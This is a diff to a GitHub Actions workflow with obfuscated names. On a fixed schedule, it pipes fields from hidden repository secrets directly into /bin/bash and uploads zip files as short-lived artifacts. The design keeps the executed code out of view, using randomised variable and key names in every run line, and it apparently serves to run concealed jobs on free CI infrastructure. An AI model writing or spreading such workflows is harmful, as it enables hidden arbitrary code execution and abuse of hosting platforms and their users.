@@ -1,9 +1,9 @@
 name: expressquantum1
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '10 3/6 * * *'
+    - cron: '0 2,8,14,20 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,21 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: expressquantum1
         env:
-          efn1: ${{ secrets.efn1 }}
+          i32: ${{ secrets.i32 }}
         run: |
-          echo $efn1 | jq -r .k8209 | /bin/bash
-          echo $uhuj09587 | jq -r .guji75 | /bin/bash
-          echo $djru2954 | jq -r .sfffo602 | /bin/bash
-          echo $h3275 | jq -r .w007 | /bin/bash
-          echo $xjsj1069 | jq -r .dmnh5898 | /bin/bash
-          echo $e75 | jq -r .ib675 | /bin/bash
-          echo $toqoa101 | jq -r .yi3 | /bin/bash
-          echo $srapf54 | jq -r .w10 | /bin/bash
-          echo $budiz68607 | jq -r .bgba29297 | /bin/bash
-          echo $e6 | jq -r .sjs8 | /bin/bash
-          echo $lpqn2 | jq -r .or06 | /bin/bash
-          echo $xfj1 | jq -r .kedq891 | /bin/bash
-          echo $cwni037 | jq -r .vqpd1 | /bin/bash
-          echo $bfti697 | jq -r .we27 | /bin/bash
-          echo $zfa04 | jq -r .vum282 | /bin/bash
+          printf '%s' "$i32" | jq -r .tobq2 | /bin/bash
+          printf '%s' "$zcfqi8426" | jq -r .syu5 | /bin/bash
+          echo $gw3 | jq -r .lrgmg38214 | /bin/bash
+          echo $gv5 | jq -r .ixb307 | /bin/bash
+          echo $fm8 | jq -r .ny27 | /bin/bash
+          printf '%s' "$y7712" | jq -r .ggsp27464 | /bin/bash
+          echo $sxvue498 | jq -r .aqpuf7 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: osELlpbt
+          path: "*.zip"
+          retention-days: 1
